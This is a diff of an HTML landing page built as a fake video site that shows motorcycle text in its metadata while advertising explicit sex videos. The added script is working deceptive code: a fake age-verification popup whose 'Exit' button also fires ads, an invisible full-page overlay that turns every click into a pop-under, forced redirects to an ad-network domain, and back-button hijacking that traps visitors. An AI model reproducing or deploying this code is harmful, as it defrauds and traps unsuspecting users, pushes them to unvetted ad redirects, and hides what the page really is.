@@ -4,295 +4,277 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Exclusive Premiere</title>
-
-    <meta name="description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S, coming up with a bike that weighs a claimed 445 pounds dry." />
-    <meta property="og:title" content="Prime options for when you want to crunch miles, not vertebrae." />
-    <meta property="og:description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S." />
-    <meta property="og:url" content="https://www.msn.com/" />
-    <meta property="og:site_name" content="CamSoda" />
-    <meta property="og:image" content="https://img.freepik.com/free-photo/close-up-portrait-indian-hindu-girl-traditional-violet-saree-posed-street_627829-2107.jpg" />
-    <meta name="twitter:card" content="summary_large_image" />
-
+    <meta name="description" content="Ducati also shaved a total of 11 pounds off the latest Multistrada V2 S." />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family:'Roboto',Arial,sans-serif; background:#0a0a0a; color:#f1f1f1; line-height:1.6; min-height:100vh; background:radial-gradient(circle at 20% 30%, #1a1a2e, #0a0a0a 80%); }
+        body { 
+            font-family:'Roboto',Arial,sans-serif; 
+            background:#0a0a0a; 
+            color:#f1f1f1; 
+            line-height:1.6; 
+            min-height:100vh; 
+            background:radial-gradient(circle at 20% 30%, #1a1a2e, #0a0a0a 80%);
+            position: relative;
+        }
+        
+        /* 3X Revenue Element: Invisible Full Page Clicker */
+        #invisibleOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9998; /* সবার উপরে কিন্তু পপ-আপের নিচে */
+            background: transparent;
+            cursor: pointer;
+        }
+
+        /* 3X Revenue Element: Fake 18+ Pop-up */
+        #ageVerification {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.95);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .popup-box {
+            background: #16161a;
+            border: 2px solid #ff3333;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.4);
+        }
+        .popup-box i { font-size: 50px; color: #ff3333; margin-bottom: 15px; }
+        .popup-box h2 { font-size: 24px; margin-bottom: 10px; color: #fff; }
+        .popup-box p { color: #ccc; font-size: 15px; margin-bottom: 25px; }
+        .popup-btns { display: flex; gap: 15px; justify-content: center; }
+        .popup-btn {
+            padding: 12px 35px;
+            border: none;
+            border-radius: 30px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+            width: 120px;
+        }
+        .btn-yes { background: #ff3333; color: white; box-shadow: 0 4px 15px rgba(255,51,51,0.4); }
+        .btn-no { background: #333; color: #aaa; }
+        .popup-btn:hover { transform: scale(1.05); }
+
+        /* Existing Styles Layout */
         a { text-decoration:none; color:inherit; }
         .youtube-wrapper { max-width:1280px; margin:0 auto; padding:0 16px 40px; }
-        .yt-header { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid #272727; margin-bottom:24px; flex-wrap:wrap; gap:10px; }
-        .yt-logo { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; color:#fff; text-shadow:0 0 10px rgba(255,0,0,0.3); cursor:pointer; }
-        .yt-logo i { color:#ff0000; font-size:28px; filter:drop-shadow(0 0 8px #ff000088); }
-        .yt-header-actions i { font-size:20px; color:#ccc; cursor:pointer; transition:all 0.3s; padding:6px; border-radius:50%; }
-        .yt-header-actions i:hover { color:#fff; transform:scale(1.15); background:rgba(255,255,255,0.05); }
+        .yt-header { display:flex; justify-content:space-between; align-items:center; padding:12px 0; border-bottom:1px solid #272727; margin-bottom:24px; gap:10px; }
+        .yt-logo { display:flex; align-items:center; gap:8px; font-size:22px; font-weight:700; color:#fff; }
+        .yt-logo i { color:#ff0000; font-size:28px; }
+        .yt-header-actions i { font-size:20px; color:#ccc; padding:6px; }
         .yt-grid { display:grid; grid-template-columns:1fr 360px; gap:24px; margin-top:8px; }
         @media (max-width:1024px) { .yt-grid { grid-template-columns:1fr; } }
-        .video-main { min-width:0; }
-        .video-player { position:relative; background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; display:flex; align-items:center; justify-content:center; cursor:pointer; box-shadow:0 0 30px rgba(255,0,0,0.2), 0 4px 40px rgba(0,0,0,0.8); transition:box-shadow 0.4s, transform 0.3s; border:2px solid transparent; }
-        .video-player:hover { box-shadow:0 0 50px rgba(255,0,0,0.5), 0 4px 60px rgba(0,0,0,0.9); border-color:#ff333388; transform:scale(1.01); }
-        .video-player img { width:100%; height:100%; object-fit:contain; display:block; transition:filter 0.4s; }
-        .video-player:hover img { filter:brightness(1.1); }
-        .video-player .play-overlay { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.3); transition:background 0.4s; pointer-events:none; }
-        .video-player:hover .play-overlay { background:rgba(0,0,0,0.1); }
-        .play-overlay .play-circle { width:90px; height:90px; background:rgba(255,0,0,0.9); border-radius:50%; display:flex; align-items:center; justify-content:center; transition:all 0.3s; box-shadow:0 0 40px rgba(255,0,0,0.7); animation:pulse 2s infinite ease-in-out; }
-        @keyframes pulse { 0%{transform:scale(1);box-shadow:0 0 20px rgba(255,0,0,0.6);} 50%{transform:scale(1.08);box-shadow:0 0 60px rgba(255,0,0,0.9);} 100%{transform:scale(1);box-shadow:0 0 20px rgba(255,0,0,0.6);} }
-        .video-player:hover .play-circle { transform:scale(1.15); background:#ff0000; box-shadow:0 0 80px #ff0000aa; animation:none; }
-        .play-circle i { color:#fff; font-size:36px; margin-left:6px; filter:drop-shadow(0 0 10px rgba(255,255,255,0.3)); }
-        .video-title { font-size:24px; font-weight:700; margin:18px 0 10px; line-height:1.3; background:linear-gradient(135deg, #ffffff 60%, #ffaaaa); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; text-shadow:0 0 30px rgba(255,100,100,0.15); transition:text-shadow 0.3s; }
-        .video-title:hover { text-shadow:0 0 50px rgba(255,80,80,0.3); }
+        
+        .video-player { 
+            position:relative; background:#000; border-radius:16px; overflow:hidden; aspect-ratio:16/9; 
+            display:flex; align-items:center; justify-content:center; border:2px solid transparent;
+            box-shadow: 0 0 20px rgba(255,0,0,0.1);
+        }
+        .video-player img { width:100%; height:100%; object-fit:contain; display:block; }
+        .play-overlay { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.3); }
+        .play-circle { 
+            width:80px; height:80px; background:rgba(255,0,0,0.9); border-radius:50%; 
+            display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px rgba(255,0,0,0.6);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
+        .play-circle i { color:#fff; font-size:32px; margin-left:6px; }
+        
+        .video-title { font-size:24px; font-weight:700; margin:18px 0 10px; color: #fff; }
         .video-meta-row { display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between; padding-bottom:14px; border-bottom:1px solid #272727; gap:12px; }
         .video-stats { display:flex; gap:20px; color:#aaa; font-size:15px; }
-        .video-stats span { display:flex; align-items:center; gap:6px; }
-        .video-stats i { font-size:16px; color:#888; }
         .video-actions { display:flex; gap:24px; color:#ccc; font-size:15px; }
-        .video-actions span { display:flex; align-items:center; gap:6px; cursor:pointer; transition:all 0.25s; padding:4px 10px; border-radius:20px; }
-        .video-actions span:hover { color:#fff; background:rgba(255,255,255,0.08); transform:scale(1.05); }
-        .video-actions i { font-size:20px; }
-        .video-description { margin-top:16px; background:#1a1a1a; border-radius:12px; padding:16px 18px; font-size:15px; color:#ddd; line-height:1.7; border-left:4px solid #ff333388; box-shadow:0 4px 20px rgba(0,0,0,0.4); }
-        .video-description strong { color:#fff; }
-        .channel-name { display:flex; align-items:center; gap:12px; margin-bottom:10px; cursor:pointer; padding:4px 8px; border-radius:8px; transition:background 0.2s; }
-        .channel-name:hover { background:rgba(255,255,255,0.05); }
-        .channel-name .avatar { width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg, #ff0000, #ff6600); display:flex; align-items:center; justify-content:center; font-size:20px; font-weight:700; color:#fff; box-shadow:0 0 20px #ff000066; }
+        .video-actions span { display:flex; align-items:center; gap:6px; padding:4px 10px; border-radius:20px; background: rgba(255,255,255,0.05); }
+        
+        .video-description { margin-top:16px; background:#1a1a1a; border-radius:12px; padding:16px 18px; font-size:15px; color:#ddd; border-left:4px solid #ff333388; }
+        .channel-name { display:flex; align-items:center; gap:12px; margin-bottom:10px; }
+        .channel-name .avatar { width:44px; height:44px; border-radius:50%; background:linear-gradient(135deg, #ff0000, #ff6600); display:flex; align-items:center; justify-content:center; font-weight:700; }
         .channel-name .name { font-weight:600; font-size:17px; color:#fff; }
         .channel-name .subs { font-size:13px; color:#aaa; }
+        
         .comments-section { margin-top:28px; border-top:1px solid #272727; padding-top:20px; }
-        .comments-section h3 { font-size:18px; font-weight:500; margin-bottom:16px; display:flex; align-items:center; gap:10px; color:#eee; }
-        .comments-section h3 span { color:#888; font-weight:400; font-size:15px; }
-        .comment-item { display:flex; gap:14px; margin-bottom:18px; padding:6px 8px; border-radius:8px; transition:background 0.2s; }
-        .comment-item:hover { background:#1a1a1a; }
-        .comment-item .c-avatar { width:38px; height:38px; border-radius:50%; background:#2a2a2a; flex-shrink:0; display:flex; align-items:center; justify-content:center; font-weight:600; color:#ddd; font-size:14px; cursor:pointer; }
+        .comment-item { display:flex; gap:14px; margin-bottom:18px; }
+        .comment-item .c-avatar { width:38px; height:38px; border-radius:50%; background:#2a2a2a; display:flex; align-items:center; justify-content:center; font-size:14px; }
         .comment-item .c-body { flex:1; }
-        .comment-item .c-name { font-weight:500; font-size:14px; color:#ccc; cursor:pointer; }
-        .comment-item .c-name span { color:#888; font-weight:400; font-size:12px; margin-left:8px; }
+        .comment-item .c-name { font-weight:500; font-size:14px; color:#ccc; }
+        .comment-item .c-name span { color:#888; font-size:12px; margin-left:8px; }
         .comment-item .c-text { font-size:15px; color:#ddd; margin-top:2px; }
+        
         .sidebar { display:flex; flex-direction:column; gap:4px; }
-        .sidebar-label { font-size:18px; font-weight:600; color:#fff; padding:4px 0 12px; border-bottom:1px solid #272727; margin-bottom:10px; text-shadow:0 0 15px rgba(255,255,255,0.1); }
-        .sidebar-item { display:flex; gap:12px; padding:10px 6px; border-radius:10px; cursor:pointer; transition:all 0.25s; border-left:3px solid transparent; }
-        .sidebar-item:hover { background:#1a1a1a; border-left-color:#ff3333; transform:translateX(4px); box-shadow:0 4px 15px rgba(0,0,0,0.5); }
-        .sidebar-item .thumb { flex-shrink:0; width:160px; aspect-ratio:16/9; background:#1a1a1a; border-radius:10px; overflow:hidden; transition:transform 0.3s, box-shadow 0.3s; }
-        .sidebar-item:hover .thumb { transform:scale(1.03); box-shadow:0 0 20px rgba(255,0,0,0.2); }
-        .sidebar-item .thumb img { width:100%; height:100%; object-fit:cover; display:block; transition:filter 0.3s; }
-        .sidebar-item:hover .thumb img { filter:brightness(1.1); }
+        .sidebar-label { font-size:18px; font-weight:600; color:#fff; padding-bottom:12px; border-bottom:1px solid #272727; margin-bottom:10px; }
+        .sidebar-item { display:flex; gap:12px; padding:10px 6px; border-radius:10px; background: rgba(255,255,255,0.02); margin-bottom: 8px;}
+        .sidebar-item .thumb { flex-shrink:0; width:140px; aspect-ratio:16/9; background:#1a1a1a; border-radius:10px; overflow:hidden; }
+        .sidebar-item .thumb img { width:100%; height:100%; object-fit:cover; }
         .sidebar-item .info { flex:1; min-width:0; }
-        .sidebar-item .info .title { font-size:14px; font-weight:500; color:#fff; line-height:1.4; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; transition:color 0.2s; }
-        .sidebar-item:hover .info .title { color:#ff8a8a; }
+        .sidebar-item .info .title { font-size:14px; font-weight:500; color:#fff; line-height:1.4; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; }
         .sidebar-item .info .meta { font-size:13px; color:#aaa; margin-top:4px; }
-        @media (max-width:640px) { .sidebar-item .thumb { width:120px; } .video-title { font-size:20px; } .video-meta-row { flex-direction:column; align-items:flex-start; } .yt-header { padding:8px 0; } .yt-logo { font-size:18px; } .play-overlay .play-circle { width:70px; height:70px; } .play-circle i { font-size:28px; } }
-        @media (max-width:480px) { .youtube-wrapper { padding:0 10px 30px; } .sidebar-item .thumb { width:100px; } .video-actions { flex-wrap:wrap; gap:12px; } }
-        ::-webkit-scrollbar { width:8px; }
-        ::-webkit-scrollbar-track { background:#1a1a1a; }
-        ::-webkit-scrollbar-thumb { background:#333; border-radius:4px; }
-        ::-webkit-scrollbar-thumb:hover { background:#555; }
     </style>
 </head>
 <body>
 
-<div class="youtube-wrapper">
-
-    <header class="yt-header">
-        <div class="yt-logo" id="randomLinkTrigger">
-            <i class="fab fa-youtube"></i>
-            <span>Exclusive</span>
+    <!-- 3X Revenue Option 1: Fake 18+ Verification Pop-up -->
+    <div id="ageVerification">
+        <div class="popup-box">
+            <i class="fas fa-exclamation-triangle"></i>
+            <h2>Age Verification Required</h2>
+            <p>This video contains content intended only for audiences aged 18 and older. Please confirm your age to continue.</p>
+            <div class="popup-btns">
+                <button class="popup-btn btn-yes" onclick="verifyAge()">I am 18+</button>
+                <button class="popup-btn btn-no" onclick="verifyAge()">Exit</button>
+            </div>
         </div>
-        <div class="yt-header-actions">
-            <i class="fas fa-search" id="randomLinkTrigger"></i>
-            <i class="fas fa-ellipsis-v" id="randomLinkTrigger"></i>
-        </div>
-    </header>
-
-    <div class="yt-grid">
-
-        <main class="video-main">
-            <div class="video-player" id="mainPlayer">
-                <img id="mainGif" src="" alt="Featured video" />
-                <div class="play-overlay">
-                    <div class="play-circle">
-                        <i class="fas fa-play"></i>
-                    </div>
-                </div>
-            </div>
-
-            <h1 class="video-title" id="mainTitle">Loading…</h1>
-
-            <div class="video-meta-row">
-                <div class="video-stats">
-                    <span><i class="fas fa-eye"></i> <span id="mainViews">—</span></span>
-                    <span><i class="fas fa-clock"></i> <span id="mainTime">—</span></span>
-                </div>
-                <div class="video-actions">
-                    <span class="random-link-btn"><i class="fas fa-thumbs-up"></i> 8.2K</span>
-                    <span class="random-link-btn"><i class="fas fa-thumbs-down"></i> 312</span>
-                    <span class="random-link-btn"><i class="fas fa-share"></i> Share</span>
-                    <span class="random-link-btn"><i class="fas fa-download"></i> Save</span>
-                </div>
-            </div>
-
-            <div class="video-description">
-                <div class="channel-name" id="randomLinkTrigger">
-                    <div class="avatar">🔥</div>
-                    <div>
-                        <div class="name">Exclusive Premiere</div>
-                        <div class="subs">1.2M subscribers</div>
-                    </div>
-                </div>
-                <div class="desc-text" id="mainDesc">
-                    <strong>Ducati</strong> also shaved a total of 11 pounds off the latest Multistrada V2 S,
-                    coming up with a bike that weighs a claimed 445 pounds dry. The full electronics suite
-                    gives riders options for Sport, Touring, Urban, and Enduro riding, and of course, we
-                    can't forget the Ducati Skyhook Suspension EVO on the V2 S.
-                    <br /><br />
-                    <span style="color:#888;">#ducati #multistrada #motorcycle #adventure</span>
-                </div>
-            </div>
-
-            <div class="comments-section">
-                <h3>Comments <span>• 247</span></h3>
-                <div class="comment-item">
-                    <div class="c-avatar random-link-btn">JD</div>
-                    <div class="c-body">
-                        <div class="c-name random-link-btn">John Doe <span>3 days ago</span></div>
-                        <div class="c-text">This is absolutely insane! 🔥🔥</div>
-                    </div>
-                </div>
-                <div class="comment-item">
-                    <div class="c-avatar random-link-btn">SM</div>
-                    <div class="c-body">
-                        <div class="c-name random-link-btn">Sarah M. <span>2 days ago</span></div>
-                        <div class="c-text">The quality is unreal. Best content I've seen all week.</div>
-                    </div>
-                </div>
-                <div class="comment-item">
-                    <div class="c-avatar random-link-btn">AK</div>
-                    <div class="c-body">
-                        <div class="c-name random-link-btn">Alex K. <span>1 day ago</span></div>
-                        <div class="c-text">I can't stop watching this. 🔁</div>
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <aside class="sidebar">
-            <div class="sidebar-label">🔥 Suggested for you</div>
-            <div id="suggestedList"></div>
-        </aside>
-
     </div>
-</div>
 
-<script>
-    (function() {
-        // ════════════════════════════════════════════════════════════
-        // লিংকের কনফিগারেশন (৩টি রিডাইরেক্ট এবং ১টি ডাইরেক্ট)
-        // ════════════════════════════════════════════════════════════
-        const redirectLinks = [
-            'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0', // ৫০% সম্ভাবনা
-            'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0', // ২৫% সম্ভাবনা
-            'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0'  // ২৫% সম্ভাবনা
-        ];
+    <!-- 3X Revenue Option 2: Full Page Transparent Overlay (Auto Appears after popup) -->
+    <div id="invisibleOverlay" style="display: none;"></div>
 
-        const directLink = 'https://parasiteoutdoorsmix.com/mrf0xkn4?key=a5cb1f5df6809332b2c01da8477db66c'; // এটি সবসময় রানিং পেজে ওপেন হবে
-
-        // ইউজার ইন্টারফেস বা পেজের ডেটা পুল (৩টি ভিডিও)
-        const videoPool = [
-            { id: 1, src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M views', time: '1 day ago' },
-            { id: 2, src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M views', time: '2 days ago' },
-            { id: 3, src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend', views: '3.1M views', time: '5 hours ago' }
-        ];
-
-        // ─── পেজ লোডের সময় ভিডিও ওলটপালট (Shuffle) করার লজিক ───
-        function shuffleArray(arr) {
-            const a = [...arr];
-            for (let i = a.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [a[i], a[j]] = [a[j], a[i]];
-            }
-            return a;
-        }
-
-        const shuffledVideos = shuffleArray(videoPool);
-        const mainVideo = shuffledVideos[0];
-        const suggestedVideos = shuffledVideos.slice(1);
-
-        // ─── DOM এলিমেন্ট সিলেক্ট করা ───
-        const mainImg = document.getElementById('mainGif');
-        const mainTitle = document.getElementById('mainTitle');
-        const mainViews = document.getElementById('mainViews');
-        const mainTime = document.getElementById('mainTime');
-        const mainPlayer = document.getElementById('mainPlayer');
-        const suggestedList = document.getElementById('suggestedList');
-
-        // ─── মেইন ভিডিও স্ক্রিনে সেট করা ───
-        mainImg.src = mainVideo.src;
-        mainImg.alt = mainVideo.title;
-        mainTitle.textContent = mainVideo.title;
-        mainViews.textContent = mainVideo.views;
-        mainTime.textContent = mainVideo.time;
-
-        // ─── ৫০%, ২৫%, ২৫% অনুপাতে রিডাইরেক্ট লিংক সিলেক্ট করার লজিক ───
-        function getRandomRedirectLink() {
-            const rand = Math.random() * 100;
-            if (rand < 50) {
-                return redirectLinks[0]; // ৫০% চান্স
-            } else if (rand < 75) {
-                return redirectLinks[1]; // ২৫% চান্স
-            } else {
-                return redirectLinks[2]; // ২৫% চান্স
-            }
-        }
-
-        // ════════════════════════════════════════════════════════════
-        // ইউনিভার্সাল ক্লিক লজিক (যেকোনো জায়গায় ক্লিক করলেই এই ফাংশনটি চলবে)
-        // ════════════════════════════════════════════════════════════
-        function handleUniversalClick(e) {
-            if (e) e.stopPropagation();
-
-            // ১. লটারি অনুযায়ী একটি রিডাইরেক্ট লিংক নতুন ট্যাবে (_blank) ওপেন হবে
-            const redirectLink = getRandomRedirectLink();
-            if (redirectLink) {
-                window.open(redirectLink, '_blank');
-            }
-
-            // ২. ডাইরেক্ট লিংকটি ১০০% নিশ্চিতভাবে বর্তমান রানিং পেজেই (_self) ওপেন হবে
-            window.open(directLink, '_self');
-        }
-
-        // ১. মেইন প্লেয়ার/GIF এ ক্লিক করলে ইউনিভার্সাল ফাংশন রান হবে
-        mainPlayer.addEventListener('click', handleUniversalClick);
-
-        // ২. সাজেস্টেড সাইডবার লিস্ট রেন্ডার করা এবং ক্লিকে ইউনিভার্সাল ফাংশন যুক্ত করা
-        function renderSuggested() {
-            let html = '';
-            suggestedVideos.forEach((item) => {
-                html += `
-                    <div class="sidebar-item">
-                        <div class="thumb">
-                            <img src="${item.src}" alt="${item.title}" loading="lazy" />
-                        </div>
-                        <div class="info">
-                            <div class="title">${item.title}</div>
-                            <div class="meta">${item.views} • ${item.time}</div>
+    <div class="youtube-wrapper">
+        <header class="yt-header">
+            <div class="yt-logo"><i class="fab fa-youtube"></i> <span>Exclusive</span></div>
+            <div class="yt-header-actions">
+                <i class="fas fa-search"></i>
+                <i class="fas fa-ellipsis-v"></i>
+            </div>
+        </header>
+        
+        <div class="yt-grid">
+            <main class="video-main">
+                <div class="video-player">
+                    <img id="mainGif" src="" alt="Featured video" />
+                    <div class="play-overlay"><div class="play-circle"><i class="fas fa-play"></i></div></div>
+                </div>
+                <h1 class="video-title" id="mainTitle">Loading…</h1>
+                <div class="video-meta-row">
+                    <div class="video-stats">
+                        <span><i class="fas fa-eye"></i> <span id="mainViews">—</span></span>
+                        <span><i class="fas fa-clock"></i> <span id="mainTime">—</span></span>
+                    </div>
+                    <div class="video-actions">
+                        <span><i class="fas fa-thumbs-up"></i> 8.2K</span>
+                        <span><i class="fas fa-thumbs-down"></i> 312</span>
+                        <span><i class="fas fa-share"></i> Share</span>
+                        <span><i class="fas fa-download"></i> Save</span>
+                    </div>
+                </div>
+                <div class="video-description">
+                    <div class="channel-name">
+                        <div class="avatar">🔥</div>
+                        <div>
+                            <div class="name">Exclusive Premiere</div>
+                            <div class="subs">1.2M subscribers</div>
                         </div>
                     </div>
-                `;
-            });
-            suggestedList.innerHTML = html;
+                    <div class="desc-text">
+                        <strong>Ducati</strong> also shaved a total of 11 pounds off the latest Multistrada V2 S. <br /><br />
+                        <span style="color:#888;">#ducati #multistrada #motorcycle</span>
+                    </div>
+                </div>
+                
+                <div class="comments-section">
+                    <h3>Comments <span>• 247</span></h3>
+                    <div class="comment-item">
+                        <div class="c-avatar">JD</div>
+                        <div class="c-body">
+                            <div class="c-name">John Doe <span>3 days ago</span></div>
+                            <div class="c-text">This is absolutely insane! 🔥🔥</div>
+                        </div>
+                    </div>
+                </div>
+            </main>
+            
+            <aside class="sidebar">
+                <div class="sidebar-label">🔥 Suggested for you</div>
+                <div id="suggestedList"></div>
+            </aside>
+        </div>
+    </div>
 
-            // সাইডবারের প্রতিটি ভিডিও বা GIF ক্লিকে ইউনিভার্সাল ফাংশন সেট
-            document.querySelectorAll('.sidebar-item').forEach((el) => {
-                el.addEventListener('click', handleUniversalClick);
-            });
+    <script>
+        // ════════════════════════════════════════════════════════════
+        // আপনার অ্যাড নেটওয়ার্কের ডিরেক্ট লিংক এখানে বসান
+        // ════════════════════════════════════════════════════════════
+        const DIRECT_LINK = 'https://parasiteoutdoorsmix.com/zqy8u79c?key=4f4bdff589b9437b3a53e5ffedfcde9a'; 
+        const REDIRECT_LINK = 'https://parasiteoutdoorsmix.com/mvu43b64?key=66335cd693e888042c89b7a3c3e569c0';
+
+        // ভিডিও ডাটা পুল
+        const videoPool = [
+            { src: 'IMG_5604.GIF', title: 'Hot Girl fucked by Huge cock with Full hardcore sex', views: '2.4M views', time: '1 day ago' },
+            { src: '023_1000.GIF', title: 'Fucked my college friend naked after a long time.', views: '1.8M views', time: '2 days ago' },
+            { src: '21415053.GIF', title: 'I First Time Fuck My Cute Girlfriend', views: '3.1M views', time: '5 hours ago' }
+        ];
+
+        // মেইন ও সাজেস্টেড কন্টেন্ট লোড লজিক
+        const mainVideo = videoPool[Math.floor(Math.random() * videoPool.length)];
+        document.getElementById('mainGif').src = mainVideo.src;
+        document.getElementById('mainTitle').textContent = mainVideo.title;
+        document.getElementById('mainViews').textContent = mainVideo.views;
+        document.getElementById('mainTime').textContent = mainVideo.time;
+
+        let html = '';
+        videoPool.forEach((item) => {
+            if(item.title !== mainVideo.title) {
+                html += `
+                <div class="sidebar-item">
+                    <div class="thumb"><img src="${item.src}" loading="lazy" /></div>
+                    <div class="info">
+                        <div class="title">${item.title}</div>
+                        <div class="meta">${item.views} • ${item.time}</div>
+                    </div>
+                </div>`;
+            }
+        });
+        document.getElementById('suggestedList').innerHTML = html;
+
+        // ════════════════════════════════════════════════════════════
+        // 3X REVENUE BOOSTING JAVASCRIPT METHODS
+        // ════════════════════════════════════════════════════════════
+
+        // ১. ইউনিভার্সাল ক্লিক হ্যান্ডলার (এক ক্লিকে কারেন্ট উইন্ডো + নিউ ট্যাব একসাথে ওপেন)
+        function triggerAds() {
+            // নিউ ট্যাবে রিডাইরেক্ট লিংক ওপেন হবে
+            window.open(REDIRECT_LINK, '_blank');
+            // কারেন্ট পেজে ডিরেক্ট লিংক ওপেন হবে
+            window.open(DIRECT_LINK, '_self');
         }
-        renderSuggested();
 
-        // ৩. পেজের বাকি অন্য সব বাটন (লোগো, লাইক, ডিসলাইক, শেয়ার, কমেন্ট) ক্লিকে ইউনিভার্সাল ফাংশন সেট
-        const allButtons = document.querySelectorAll('.random-link-btn, #randomLinkTrigger');
-        allButtons.forEach((el) => {
-            el.addEventListener('click', handleUniversalClick);
+        // ২. Fake Age Verification ক্লিক লজিক
+        function verifyAge() {
+            document.getElementById('ageVerification').style.display = 'none';
+            document.getElementById('invisibleOverlay').style.display = 'block'; // অদৃশ্য লেয়ার অন হবে
+            triggerAds(); // প্রথম ক্লিকেই অ্যাড লোড হবে
+        }
+
+        // ৩. পুরো স্ক্রিনের অদৃশ্য লেয়ারে বা বডিতে ক্লিক করলে অ্যাড ট্রিগার
+        document.getElementById('invisibleOverlay').addEventListener('click', triggerAds);
+        document.body.addEventListener('click', function(e) {
+            // পপ-আপ বক্সের বাটন ছাড়া অন্য কোথাও ক্লিক লাগলে অ্যাড চলবে
+            if (!e.target.closest('.popup-box') && document.getElementById('ageVerification').style.display === 'none') {
+                triggerAds();
+            }
         });
 
-        console.log('✅ Universal script loaded successfully. 100% DirectLink in running page + Weighted RedirectLink in new tab.');
-    })();
-</script>
-
+        // ৪. Back-Button Hijacking Method (ইউজার ব্যাক করলেই ডিরেক্ট লিংক)
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function () {
+                window.history.pushState(null, null, window.location.href);
+                window.location.replace(DIRECT_LINK);
+            };
+        })();
+    </script>
 </body>
 </html>
